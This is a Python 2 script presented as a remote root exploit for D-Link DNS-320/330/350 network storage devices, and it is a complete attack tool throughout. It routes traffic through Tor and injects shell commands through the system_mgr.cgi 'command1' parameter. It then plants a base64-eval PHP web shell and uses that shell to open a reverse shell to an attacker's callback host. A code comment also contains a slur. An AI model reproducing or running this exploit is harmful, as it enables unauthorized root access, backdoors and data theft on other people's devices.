#!/usr/bin/python2
# coding: utf-8
import requesocks
import sys

red = "\x1b[1;31m"
green = "\x1b[1;32m"
yellow = "\x1b[1;33m"
blue = "\x1b[1;34m"
magenta = "\x1b[1;35m"
cyan = "\x1b[1;36m"
white = "\x1b[1;37m"
clear = "\x1b[0m"

proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

def banner():
    print """
%s██████╗      ██╗      ██████╗ ███████╗███████╗██████╗ %s
%s██╔══██╗     ██║     ██╔═══██╗██╔════╝██╔════╝██╔══██╗%s
%s██║  ██║ ███ ██║     ██║ █ ██║███████╗█████╗  ██████╔╝%s
%s██║  ██║     ██║     ██║   ██║╚════██║██╔══╝  ██╔══██╗%s
%s██████╔╝     ███████╗╚██████╔╝███████║███████╗██║  ██║%s
%s╚═════╝      ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝%s
%sD-Link DNS-320/330/350/x Remote Root Exploit v1.1%s
    """ %(red, clear, green, clear, yellow, clear, blue, clear, magenta, clear, cyan, clear, white, clear)

def banner_grab(target):
    sys.stdout.write("%s{*} Checking target fingerprint...%s" %(blue, clear))
    sys.stdout.flush()
    try:
        r = requesocks.head(url=target, proxies=proxies, verify=False)
    except Exception, e:
        sys.stdout.write(" %s[failed]%s\n" %(red, clear))
        sys.exit(0)
    if r.headers['server'] != "lighttpd/1.4.25-devel-fb150ff":
        sys.stdout.write(" %s[not vulnerable]%s\n" %(red, clear))
        sys.exit(0)
    else:
        sys.stdout.write(" %s[possibly vulnerable]%s\n" %(green, clear))

def check_cgi(target):
    url = target + "/cgi-bin/system_mgr.cgi"
    sys.stdout.write("%s{*} Checking for /cgi-bin/system_mgr.cgi...%s" %(blue, clear))
    sys.stdout.flush()
    try:
        r = requesocks.head(url=url, proxies=proxies, verify=False)
    except Exception, e:
        sys.stdout.write(" %s[failed]\n%s" %(red, clear))
        sys.exit(0)
    if r.status_code == 404:
        sys.stdout.write(" %s[not vulnerable]%s\n" %(red, clear))
        sys.exit(0)
    else:
        sys.stdout.write(" %s[probably vulnerable]%s\n" %(green, clear))        

def check_0day(target):
    sys.stdout.write("%s{*} Testing for 0day command injection vector...%s" %(blue, clear))
    sys.stdout.flush()
    url = target + "/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1=id;"
    try:
        r = requesocks.get(url=url, proxies=proxies, verify=False)
    except Exception, e:
        sys.stdout.write(" %s[failed]\n%s" %(red, clear))
        sys.exit(0)
    if r.text:
        if "uid=0" in r.text:
            sys.stdout.write(" %s[vulnerable]%s\n" %(green, clear))
        else:
            sys.stdout.write(" %s[not vulnerable]%s\n" %(red, clear)) 
            sys.exit(0)
    else:
        sys.stdout.write(" %s[failed]%s\n" %(red, clear))
        sys.exit(0)

def execute_command(target, command):
    command = command.replace(' ', '%20')
    url = target + "/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1=%s" %(command)
    try:
        r = requesocks.get(url=url, proxies=proxies, verify=False)
    except Exception, e:
        sys.exit("%s{-} Exception hit! Printing stack trace...\n%s%s" %(red, str(e), clear))
    output = r.text.replace("Content-type: text/html", "")
    return output.rstrip()
    
def get_information(target):
    sys.stdout.write("%s{>} Current UID: %s" %(magenta, clear))
    sys.stdout.flush()
    try:
        uid = execute_command(target, command='id -u')
    except Exception, e:
        sys.exit("%s{-} Exception hit! Printing stack trace...\n%s%s" %(red, str(e), clear))
    sys.stdout.write(cyan+uid+clear+"\n")
    sys.stdout.write("%s{>} Architecture: %s" %(magenta, clear))
    sys.stdout.flush()
    try:
        arch = execute_command(target, command='uname -m')
    except Exception, e:
        sys.exit("%s{-} Exception hit! Printing stack trace...\n%s%s" %(red, str(e), clear))
    sys.stdout.write(cyan+arch+clear+"\n")

def upload_shell(target):
    print "%s{*} Uploading PHP stager shell...%s" %(blue, clear)
    php_shell = "<?php eval(base64_decode($_REQUEST['woot'])); ?>"
    payload = ''.join(["\\x%.2x" % ord(byte) for byte in php_shell])
    upload = execute_command(target, command="echo -ne '%s'>/var/www/ajaxplorer/plugins/access.remote_fs/pwn.php" %(payload))
    check_shell(target)
    
def encode_php(phpcode): #base64 that shit niqqa!
    phpcode = phpcode.encode('base64')
    phpcode = phpcode.replace("\n", "")
    phpcode = phpcode.strip()
    return phpcode

def execute_php(target, php):
    php = encode_php(phpcode=php)
    postdata = {'woot': php}
    url = target + '/ajaxplorer/plugins/access.remote_fs/pwn.php'
    try:
        execute = requesocks.post(url=url, data=postdata, proxies=proxies, verify=False, allow_redirects=False)
    except Exception, e:
        sys.exit("%s{-} Something went horribly wrong. Bailing!\n%s%s" %(red, str(e), clear))
    output = execute.text.rstrip()
    return output

def check_shell(target):
    sys.stdout.write("%s{*} Checking shell...%s" %(blue, clear))
    sys.stdout.flush()
    try:
        probe = execute_php(target, php="echo md5('hacktheplanet');")
    except Exception, e:
        sys.stdout.write(" %s[failed]%s\n" %(red, clear))
        sys.stdout.flush()
        sys.exit(str(e))
    if "254e5f2c3beb1a3d03f17253c15c07f3" in probe:
        sys.stdout.write(" %s[success]%s\n" %(green, clear))
        sys.stdout.flush()
    else:
        sys.stdout.write(" %s[failed]%s\n" %(red, clear))
        print probe
        sys.stdout.flush()
        sys.exit(0)

def pop_php_backconnect(target, callback_host, callback_port):
    sys.stdout.write("%s{*} Getting our reverse shell...%s" %(blue, clear))
    sys.stdout.flush()
    f = open("callback.php", "r")
    buf = f.read()
    buf = buf.replace("<?php", "")
    buf = buf.replace("?>", "")
    buf = buf.replace("XXCBHXX", callback_host)
    buf = buf.replace("XXCBPXX", callback_port)
    execute_php(target, php=buf)
    sys.stdout.write(" [done]\n")
    sys.stdout.flush()

def exploit(target, callback_host, callback_port):
    banner_grab(target=target)
    check_cgi(target=target)
    print "%s{i} Probably vulnerable, we can proceed :)%s" %(yellow, clear)
    check_0day(target=target)
    print "%s{i} Getting remote system information...%s" %(yellow, clear)
    get_information(target)
    print "%s{i} Information gathering complete... Proceeding to exploitation.%s" %(yellow, clear)
    print "%s{>} Callback Host: %s%s%s" %(magenta, cyan, callback_host, clear)
    print "%s{>} Callback Port: %s%s%s" %(magenta, cyan, callback_port, clear)
    upload_shell(target)
   # print execute_php(target, php="system('id');")
    pop_php_backconnect(target, callback_host, callback_port)

def main(args):
    banner()
    if len(args) != 4:
        sys.exit("use: %s http://target:port callback_host callback_port" %(args[0]))
    exploit(target=args[1], callback_host=args[2], callback_port=args[3])
    
if __name__ == "__main__":
    main(args=sys.argv)
